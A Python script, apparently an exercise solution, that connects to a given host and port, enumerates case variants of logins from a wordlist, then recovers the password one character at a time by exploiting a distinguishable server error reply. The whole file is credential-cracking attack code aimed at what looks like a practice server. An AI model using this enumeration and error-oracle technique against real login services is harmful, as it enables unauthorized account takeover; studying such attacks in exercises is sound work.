#  Try all logins with an empty password.
#  When you find the login, try out every possible password of length 1.
#  When an exception occurs, you know that you found the first letter of the password.
#  Use the found login and the found letter to find the second letter of the password.
#  Repeat until you receive the ‘success’ message.

import sys
import socket
import itertools
import json

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

conn = socket.socket()
args = sys.argv
ip_addr = args[1]
port = int(args[2])
conn.connect((ip_addr, port))

# mesg = ''
# i = 1
# loop = True
# while loop:
#     for x in itertools.product(letters, repeat=i):
#         for n in range(i):
#            mesg = mesg + x[n]
#         byt_msg = mesg.encode()
#         conn.send(byt_msg)
#         sevr_meg = conn.recv(1024)
#         respond = sevr_meg.decode()
#         if respond == 'Connection success!':
#             loop = False
#             print(mesg)
#         mesg = ''
#     i += 1
# conn.close()
login = ''
password = ''

a = open('logins.txt', 'r')
check = True

for x in a:
    if check is False:
        break
    pw = (x.rstrip('\n'))

    results = list(map(''.join, itertools.product(*zip(pw.upper(), pw.lower()))))
    # print(results)
    for y in results:
        jmsg = {
            "login": y,
            "password": " "
        }
        byt_msg = (json.dumps(jmsg)).encode()
        conn.send(byt_msg)
        sevr_meg = conn.recv(1024)
        respond = sevr_meg.decode()
        jstr = json.loads(respond)
        if jstr == {"result": "Wrong password!"}:
            login = y
            # conn.close()
            check = False
            break

flag = True

while flag:
    for x in letters:
        jmsg_login = {"login": login, "password": password + x}
        byt_msg = (json.dumps(jmsg_login)).encode()
        conn.send(byt_msg)
        sevr_meg = conn.recv(1024)
        respond = sevr_meg.decode()
        jstr = json.loads(respond)
        if jstr == {"result": "Exception happened during login"}:
            password = password + x
            break
        elif jstr == {"result": "Connection success!"}:
            print(json.dumps(jmsg_login))
            flag = False
            conn.close()
            exit()
